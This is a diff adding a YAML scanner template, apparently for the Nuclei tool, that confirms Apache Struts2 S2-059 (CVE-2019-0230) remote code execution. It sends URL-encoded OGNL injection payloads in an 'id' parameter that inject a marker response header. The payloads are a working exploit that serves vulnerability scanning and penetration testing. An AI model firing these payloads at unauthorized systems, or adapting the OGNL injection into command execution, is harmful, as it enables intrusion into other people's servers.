@@ -1,0 +1,26 @@
+id: local-struts2-s2-059-header-rce
+
+info:
+  name: Struts2 S2-059 Response Header Injection (CVE-2019-0230)
+  author: pentest-platform
+  severity: critical
+  description: |
+    Apache Struts 2 S2-059 RCE confirmation via OGNL injection in tag attributes.
+    Injects a custom response header to confirm code execution without InstanceManager.
+  tags: safe-poc,exploit,struts2,s2-059,cve,cve2019,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=%25%7B(%23context%5B'com.opensymphony.xwork2.dispatcher.HttpServletResponse'%5D.addHeader('X-S2-059-RCE','pentest-platform-s2059-rce'))%7D"
+      - "{{BaseURL}}/index.action?id=%25%7B(%23context%5B'com.opensymphony.xwork2.dispatcher.HttpServletResponse'%5D.addHeader('X-S2-059-RCE','pentest-platform-s2059-rce'))%7D"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "pentest-platform-s2059-rce"
+      - type: status
+        status:
+          - 200
